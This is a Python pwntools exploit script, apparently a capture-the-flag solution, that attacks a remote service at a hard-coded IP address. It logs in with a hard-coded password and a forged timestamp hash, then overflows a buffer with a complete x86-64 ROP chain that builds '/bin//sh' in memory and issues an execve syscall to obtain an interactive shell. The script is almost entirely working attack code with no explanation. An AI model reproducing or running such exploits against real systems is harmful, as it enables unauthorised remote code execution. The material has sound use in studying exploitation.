import pwn
import struct
import time
import subprocess
import re

LOCAL = False

if LOCAL:
    sh = pwn.process('hive')
else:
    sh = pwn.remote('104.196.102.240', 5000)

def get_timestamp_hash (timestamp) :
    proc = subprocess.Popen('./hive_patched', stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    stdout, stderr = proc.communicate(struct.pack('<L', timestamp))
    return stdout[-33:]

def login(sh):
    initial = sh.recv(1024)
    timestr = re.findall('time is: (.*?),', initial)[0]
    print '[+] timestr', timestr
    timehash = get_timestamp_hash(int(timestr))
    print '[+] timehash', timehash

    sh.sendline('username')
    sh.sendline('5up3rm@n')
    sh.sendline(timehash)

def build_rop():
    pack = struct.pack    
    p = pack('<Q', 0x000000000040225f) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c11e0) # @ .data
    p += pack('<Q', 0x000000000043c6ad) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x0000000000472da1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x000000000040225f) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c11e8) # @ .data + 8
    p += pack('<Q', 0x0000000000419eb5) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000472da1) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004033cb) # pop rdi ; ret
    p += pack('<Q', 0x00000000006c11e0) # @ .data
    p += pack('<Q', 0x000000000040225f) # pop rsi ; ret
    p += pack('<Q', 0x00000000006c11e8) # @ .data + 8
    p += pack('<Q', 0x000000000043df25) # pop rdx ; ret
    p += pack('<Q', 0x00000000006c11e8) # @ .data + 8
    p += pack('<Q', 0x0000000000419eb5) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000467070) # add rax, 1 ; ret
    p += pack('<Q', 0x0000000000447f31) # syscall
    return p

def exploit(sh):
    sh.recvuntil('Do some evil another day')
    sh.sendline('3')
    
    sh.recvuntil('taunt the heroes identified most viciously!')
    sh.sendline('0'*100 + 'w') # Between 99 and 106 chars that sum to 0x1337

    buf = 'a'*0x88
    buf += build_rop()
    
    sh.recvuntil('send the heroes!')
    sh.sendline(buf)

    sh.interactive()


if __name__ == '__main__':
    login(sh)
    exploit(sh)
